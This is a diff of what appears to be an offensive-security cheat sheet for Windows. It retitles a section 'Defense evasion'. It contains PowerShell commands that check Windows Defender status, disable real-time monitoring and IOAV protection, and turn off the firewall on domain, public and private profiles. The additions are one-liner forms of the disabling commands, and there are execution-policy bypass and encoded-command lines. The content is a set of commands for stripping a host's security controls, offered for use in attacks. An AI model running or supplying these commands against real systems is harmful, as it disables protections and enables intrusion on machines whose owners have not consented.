@@ -23,7 +23,7 @@ powershell –enc
 powershell.exe -executionpolicy bypass
 ```
 
-## AV
+## Defense evasion
 #### Check if windows defender is running
 ```
 Get-MpComputerStatus
@@ -34,11 +34,15 @@ Get-MpComputerStatus | Select RealTimeProtectionEnabled
 ```
 Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPReference -DisableIOAVProtection $true
+
+powershell.exe -c 'Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPReference -DisableIOAVProtection $true'
 ```
 
 #### Disable Firewall
 ```
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False 
+
+powershell.exe -c 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False'
 ```
 
 ## Constrained Lanuage Mode
